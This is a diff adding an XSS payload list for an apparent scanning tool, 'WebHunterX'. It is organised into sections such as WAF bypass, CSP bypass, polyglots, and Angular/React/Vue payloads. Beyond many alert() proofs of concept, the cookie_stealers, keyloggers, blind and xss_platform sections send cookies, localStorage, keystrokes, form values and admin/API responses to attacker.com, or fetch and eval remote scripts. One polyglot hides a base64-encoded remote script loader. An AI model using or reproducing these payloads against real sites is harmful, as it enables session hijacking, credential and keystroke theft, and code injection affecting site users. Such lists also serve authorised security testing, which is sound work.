@@ -1,0 +1,257 @@
+# WebHunterX XSS Payloads
+# Format: [section] pour chaque type d'attaque
+# Chaque ligne est un payload distinct
+
+[basic]
+<script>alert('XSS')</script>
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+<script>prompt(1)</script>
+<script>confirm(1)</script>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+<script src=javascript:alert(1)></script>
+<script>alert(/XSS/)</script>
+
+[img]
+<img src=x onerror=alert('XSS')>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=alert(document.cookie)>
+<img src="javascript:alert('XSS')">
+<img src=x onerror="javascript:alert(1)">
+<IMG SRC=# onerror="alert('XSS')">
+<IMG SRC="javascript:alert('XSS');">
+<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>
+
+[svg]
+<svg onload=alert('XSS')>
+<svg onload=alert(1)>
+<svg/onload=alert('XSS')>
+<svg/onload=alert(document.domain)>
+<svg/onload=alert(document.cookie)>
+<svg><script>alert(1)</script>
+<svg><animate onbegin=alert(1) attributeName=x></animate>
+<svg><a><animate attributeName=href values=javascript:alert(1) /></a><text x=20 y=20>Click me</text>
+
+[div]
+<div onmouseover="alert('XSS')">hover me</div>
+<div onclick="alert('XSS')">click me</div>
+<div onmouseenter="alert(document.cookie)">hover me</div>
+<div onload="alert('XSS')">load me</div>
+
+[input]
+<input autofocus onfocus=alert(1)>
+<input autofocus onfocus=alert('XSS')>
+<input onfocus=alert(document.domain) autofocus>
+<input type="image" src="x" onerror="alert('XSS')">
+<input type="image" src="x:x" onerror="alert(1)">
+
+[iframe]
+<iframe src="javascript:alert('XSS')"></iframe>
+<iframe src=javascript:alert(1)></iframe>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<iframe src="javascript:alert(document.cookie)"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>
+
+[a]
+<a href="javascript:alert('XSS')">click me</a>
+<a href="javascript:alert(1)">click me</a>
+<a href="javascript:alert(document.domain)">click me</a>
+<a href="javascript:alert(document.cookie)">click me</a>
+<a onmouseover="alert('XSS')">hover me</a>
+<a onclick="alert(1)">click me</a>
+
+[obfuscated]
+<script>eval(atob('YWxlcnQoIlhTUyIpOw=='))</script>
+<img src=x onerror=eval(atob('YWxlcnQoIlhTUyIpOw=='))>
+<svg onload=eval(atob('YWxlcnQoIlhTUyIpOw=='))>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
+<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+<svg/onload="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
+javascript:eval('ale'+'rt(1)')
+<script>setTimeout('ale'+'rt(1)',0)</script>
+<img src=x onerror="setTimeout('ale'+'rt(1)',0)">
+<svg onload="setTimeout('ale'+'rt(1)',0)">
+<script>['ale'+'rt'](1)</script>
+
+[dom]
+<script>document.write('<img src=x onerror=alert(1)>')</script>
+<script>document.write('<script>alert(1)<\/script>')</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+location='javascript:alert(1)'
+<script>location='javascript:alert(1)'</script>
+<script>location.href='javascript:alert(1)'</script>
+<script>window.location='javascript:alert(1)'</script>
+<script>document.location='javascript:alert(1)'</script>
+<script>document.location.href='javascript:alert(1)'</script>
+
+[css]
+<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(1)"></div>
+<style>@keyframes x{}</style><div style="animation-name:x" onwebkitanimationstart="alert(1)"></div>
+<div style="background-image:url(javascript:alert(1))">
+<div style="width:expression(alert(1));">
+<style>body{background-image:url('javascript:alert(1)')}</style>
+
+[event]
+<body onload="alert('XSS')">
+<body onloadstart="alert('XSS')">
+<body onpageshow="alert(1)">
+<body onfocus="alert(1)">
+<body onhashchange="alert(1)">
+<body onresize="alert(1)">
+<body onscroll="alert(1)">
+<body onunload="alert(1)">
+
+[waf_bypass]
+<scr<script>ipt>alert(1)</script>
+<script>a=alert;a(1);</script>
+<script>al\u0065rt(1)</script>
+<script>al&#x65;rt(1)</script>
+<script>al&#101;rt(1)</script>
+<script>alert&#40;1&#41;</script>
+<script>alert&#x28;1&#x29;</script>
+<script>\u0061lert(1)</script>
+<script>+alert(1)</script>
+<script>alert`1`</script>
+<<script>alert(1);//<</script>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:,alert(1)"></script>
+<script>$=alert;$(1)</script>
+<script>_=alert;_(1)</script>
+<script>this['ale'+'rt'](1)</script>
+<script>top['al\x65rt'](1)</script>
+<script>parent['ale\162t'](1)</script>
+<script>self['ale'+'rt'](1)</script>
+<script>window['ale'+'rt'](1)</script>
+<script>parent['ale'+'rt'](1)</script>
+
+[polyglots]
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)>
+<script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vYXR0YWNrZXJzaXRlLmNvbS9pbmplY3QuanMiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7 onerror=eval(atob(this.id))>
+
+[cookie_stealers]
+<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
+<script>navigator.sendBeacon('https://attacker.com/steal', document.cookie)</script>
+<script>new Image().src='https://attacker.com/steal?cookie='+document.cookie</script>
+<script>document.location='https://attacker.com/steal?cookie='+document.cookie</script>
+<script>var i=new Image();i.src='https://attacker.com/steal?cookie='+document.cookie</script>
+<script>window.location='https://attacker.com/steal?cookie='+document.cookie</script>
+<script>var xhr=new XMLHttpRequest();xhr.open('GET','https://attacker.com/steal?cookie='+document.cookie,true);xhr.send();</script>
+<script>navigator.sendBeacon('https://attacker.com/steal', JSON.stringify({cookie:document.cookie,location:document.location,origin:window.origin,localStorage:JSON.stringify(localStorage)}))</script>
+
+[keyloggers]
+<script>document.onkeypress=function(e){fetch('https://attacker.com/k?'+String.fromCharCode(e.which))}</script>
+<script>document.addEventListener('keypress',function(e){fetch('https://attacker.com/k?'+e.key)})</script>
+<script>window.addEventListener('keydown',function(e){navigator.sendBeacon('https://attacker.com/k',e.key)})</script>
+<img src=x onerror="document.onkeypress=function(e){fetch('https://attacker.com/k?'+e.key)}">
+<body onload="document.onkeypress=function(e){fetch('https://attacker.com/k?'+e.key)}">
+
+[xss_platform]
+<script src=https://attacker.com/xss.js></script>
+<script src="https://attacker.com/xss.js"></script>
+<script src=//attacker.com/xss.js></script>
+<svg/onload="import('//attacker.com/xss.js')">
+<svg/onload="fetch('//attacker.com/xss.js').then(r=>r.text()).then(eval)">
+<iframe src="javascript:import('//attacker.com/xss.js')"></iframe>
+<script>eval(await(await fetch('//attacker.com/xss.js')).text())</script>
+<img src="x" onerror="fetch('//attacker.com/xss.js').then(r=>r.text()).then(eval)">
+<link rel="import" href="//attacker.com/xss.js">
+<object data="//attacker.com/xss.js"></object>
+
+[unicode]
+<ſcript>alert(1)</ſcript>
+<ſvg onload=alert(1)>
+<img src=x onerror=\u0061lert(1)>
+<\u0073cript>alert(1)</script>
+<\u0073vg onload=alert(1)>
+<\u0069mg src=x onerror=alert(1)>
+<script>\u0061lert(1)</script>
+<svg/onload=\u0061lert(1)>
+<img src=x onerror=\u0061\u006cert(1)>
+
+[blind]
+<script>fetch('/sensitive-internal-page').then(_=>fetch('https://attacker.com/?pwned'))</script>
+<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('https://attacker.com/?d='+btoa(t)))</script>
+<script>fetch('/api/user').then(r=>r.json()).then(j=>fetch('https://attacker.com/?d='+btoa(JSON.stringify(j))))</script>
+<img src=x onerror="fetch('/api/config').then(r=>r.text()).then(t=>fetch('https://attacker.com/?d='+btoa(t)))">
+<script>for(i=0;i<document.forms.length;i++){f=document.forms[i];for(j=0;j<f.elements.length;j++){e=f.elements[j];if(e.type!='hidden'){e.onchange=function(){fetch('https://attacker.com/?v='+this.value+'&n='+this.name)}}}}}</script>
+
+[csp_bypass]
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script src="data:,alert(1)"></script>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<script src="data:text/javascript,alert(1)"></script>
+<script src="data:application/javascript,alert(1)"></script>
+<script src="data:application/javascript;base64,YWxlcnQoMSk="></script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<img src=x onerror="location='javascript:'+String.fromCharCode(97,108,101,114,116,40,49,41)">
+<script>setTimeout('alert(1)',0)</script>
+<script>location='javascript:alert(1)'</script>
+<base href="javascript:/a/-alert(1)///////"><a href="./test">Click me</a>
+<script src="//attacker.com/xss.js"></script>
+
+[angular]
+{{constructor.constructor('alert(1)')()}}
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='javascript:alert(1)//'"></textarea></div>
+{{$on.constructor('alert(1)')()}}
+{{$eval.constructor('alert(1)')()}}
+<input autofocus ng-focus="$event.path[0].ownerDocument.location='javascript:alert(1)'">
+{{constructor.constructor('alert(document.domain)')()}}
+<div ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</div>
+
+[react]
+<img src=x onError={alert(1)} />
+<img src=x onError={"alert(1)"} />
+<img src=x onError={e => { alert(1) }} />
+<div dangerouslySetInnerHTML={{__html: '<img src=x onerror=alert(1)>'}}></div>
+<div dangerouslySetInnerHTML={{__html: `<img src=x onerror=alert(1)>`}}></div>
+<a href="javascript:alert(1)">Click me</a>
+
+[vue]
+<div v-html="'<img src=x onerror=alert(1)>'"></div>
+<p v-html="'<img src=x onerror=alert(1)>'"></p>
+<div v-bind:onclick="'alert(1)'">Click me</div>
+<div v-on:click="'alert(1)'">Click me</div>
+<span v-bind:onclick="`alert(1)`">Click me</span>
+<img src="x" v-bind:onerror="'alert(1)'">
+
+[advanced_csp_bypass]
+<script nonce="PREDICTED_OR_EXTRACTED_NONCE">alert(1)</script>
+<script nonce="%2BPREDICTED_OR_EXTRACTED_NONCE">alert(1)</script>
+<iframe src="data:text/html,<script>fetch('/api/sensitive').then(r=>r.text()).then(t=>fetch('https://attacker.com/?d='+btoa(t)))</script>"></iframe>
+<link rel="prefetch" href="data:text/html,<script>alert(1)</script>">
+<meta http-equiv="refresh" content="0;url=data:text/html,%3Cscript%3Ealert(1)%3C/script%3E">
+<object data="data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+<script src="blob:https://allowed-origin.com/PREDICTED_BLOB_URL"></script>
+<img src="x" srcset="data:,a 1w, https://attacker.com/?a=l 50w, https://attacker.com/?e=r 50w, https://attacker.com/?t=( 50w, https://attacker.com/?1=) 50w">
+<style>@import 'data:text/css;base64,KiB7IGJhY2tncm91bmQtaW1hZ2U6IHVybCgnamF2YXNjcmlwdDphbGVydCgxKScpOyB9';</style>
+<img src='https://JSONP-ENDPOINT?callback=alert(1)'>
+<base target="_blank">
+<form action="javascript:alert(1)"><input type="submit">
+<math><maction xlink:href="javascript:alert(1)">click</maction></math>
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<object data="data:application/x-shockwave-flash,<script>alert(1)</script>">
+<script/x src="x:1" onerror="alert(1)"></script>
+
+[header_injection]
+Content-Type: text/html\r\n\r\n<script>alert(1)</script>
+Content-Type: text/html\r\nX-XSS-Protection:0\r\n\r\n<script>alert(1)</script>
+Set-Cookie: cookie=x\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>
+HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>
+\n\n<script>alert(1)</script>
+\r\n\r\n<script>alert(1)</script>
+\r\n\n<script>alert(1)</script>
+
+[prototype_pollution]
+{"__proto__":{"onerror":"alert(1)"}}
+{"constructor":{"prototype":{"onerror":"alert(1)"}}}
+{"__proto__":{"src":"x","onerror":"alert(1)"}}
+{"__proto__":{"srcdoc":"<script>alert(1)</script>"}}
+{"__proto__":{"data":"javascript:alert(1)"}}
+{"__proto__":{"href":"javascript:alert(1)"}} 
